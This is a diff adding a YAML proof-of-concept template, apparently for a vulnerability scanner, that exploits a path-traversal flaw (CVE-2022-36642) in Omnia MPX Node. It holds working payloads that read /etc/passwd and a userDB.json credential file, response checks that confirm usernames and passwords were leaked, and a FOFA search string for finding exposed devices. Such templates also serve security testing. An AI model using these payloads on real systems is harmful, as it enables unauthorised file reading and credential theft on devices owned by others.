@@ -1,0 +1,38 @@
+id: poc-yaml-omnia-mpx-node-overview-logs-anyfile-read
+info:
+  name: Omnia MPX Node Overview logs 任意文件读取漏洞(CVE-2022-36642)
+  severity: high
+  tags:
+  - CVE-2022-36642
+  - 任意文件或目录访问
+  finger: omnia mpx node overview
+  fofa: title="Omnia MPX Node | Login"
+variables:
+  url_path: 'logs/downloadMainLog?fname=../../../../../../..//etc/passwd
+
+    logs/downloadMainLog?fname=../../../../../../..///config/MPXnode/www/appConfig/userDB.json
+
+    '
+requests:
+- method: GET
+  path: /{{.url_path}}
+  expression: 'status_code == 200 &&
+
+    ((
+
+    contains(body,"root:") && contains(body,"/bin")
+
+    && !contains(body,"<")
+
+    )
+
+    ||
+
+    (
+
+    contains(body,"\"username\":") && contains(body,"\"password\":") && contains(body,"\"roleUser\":")
+
+    ))
+
+    '
+transport: http
